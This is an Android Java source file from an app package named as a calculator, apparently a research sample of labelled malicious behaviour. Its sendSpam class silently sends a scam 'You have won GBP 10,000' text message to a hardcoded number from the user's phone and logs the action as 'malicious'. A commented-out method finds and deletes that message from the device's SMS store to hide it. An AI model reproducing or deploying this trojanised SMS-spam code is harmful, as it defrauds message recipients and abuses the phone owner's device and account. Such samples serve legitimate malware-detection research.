package com.researchers.calculator_v13;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.util.Log;

import java.util.ArrayList;

//import android.app.Service;
//import android.os.IBinder;
//import android.widget.Toast;

//import android.

public class sendSpam {
    String phoneNo = "+911234567890";
    String spamSms = "You have won GBP 10,000. Contact immediately to claim the reward.";
    String TAG = "SPAM";
    Clues clue = new Clues();

    public void sendSMS(String phn, String sms, Context curr) {
        ArrayList<PendingIntent> sentPendingIntents = new ArrayList<PendingIntent>();
        ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<PendingIntent>();
        PendingIntent sentPI = PendingIntent.getBroadcast(curr, 0, new Intent(curr, SmsSentReceiver.class), 0);
        PendingIntent deliveredPI = PendingIntent.getBroadcast(curr, 0, new Intent(curr, SmsDeliveredReceiver.class), 0);

        try {
            SmsManager smsMan = SmsManager.getDefault();
            ArrayList<String> mSMSMessage = smsMan.divideMessage(sms);
            for (int i = 0; i < mSMSMessage.size(); i++) {
                sentPendingIntents.add(i, sentPI);
                deliveredPendingIntents.add(i, deliveredPI);
            }

            clue.SendLog(TAG, "Requested to send " + sms + " spam SMS to " + phn, "malicious", true);
            smsMan.sendMultipartTextMessage(phn, null, mSMSMessage, sentPendingIntents, deliveredPendingIntents);
            //Toast.maeText(curr, "SPAM sent", Toast.LENGTH_SHORT).show();
            //clue.SendLog(TAG, "sent");
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, "SMS not sent");
            clue.SendLog(TAG, "Spam SMS not sent");
        }
    }

    /*public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "onStartCommand");
        Toast.makeText(getBaseContext(), "Started service", Toast.LENGTH_LONG).show();
        Log.i(TAG, "sending SMS - " + spamSms + " to " + phoneNo);
        sendSMS(phoneNo, spamSms);
        int i = super.onStartCommand(intent, flags, startId);
        stopSelf();
        return i;
    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "onDestroy sendSpam");
        super.onDestroy();
    }*/

    /*public void deleteSms(String phn, String spmSms, Context curr) {
        Uri allMessages = Uri.parse("content://sms/");
        Cursor cursor = curr.getContentResolver().query(allMessages, null, null, null, null);
        String where = "body='?'";
        String[] args = new String[] {spmSms};
        //int cr = curr.getContentResolver().delete(allMessages, where, args);


        if (cursor != null && cursor.getColumnCount() > 0) {

        while (cursor.moveToNext())
        {
            for(int i=0; i < cursor.getColumnCount(); i++) {
                //Log.d(cursor.getColumnName(i) + "", String.valueOf(i) + cursor.getString(i) + "");
                /*if(cursor.getColumnName(i).equals("address") && cursor.getString(i).equals(phoneNo)) {
                    for(int j=i+1; j < cursor.getColumnCount(); j++) {
                        if(cursor.getColumnName(i).equals("body") && cursor.getString(i).equals(spmSms)) {

                        }
                    }
                }
            }
            if( cursor.getString(2).equals(phn + "") && cursor.getString(12).equals(spmSms + ""))
            {
                long calid = cursor.getLong(0);
                Uri delUri = ContentUris.withAppendedId(allMessages, calid);
                int cr = curr.getContentResolver().delete(delUri, null, null);
                Log.d("Deleted", String.valueOf(cr) + " rows");
            }
            //Log.d("One row finished", "**************************");
        }
        }

        cursor.close();
    }*/

}
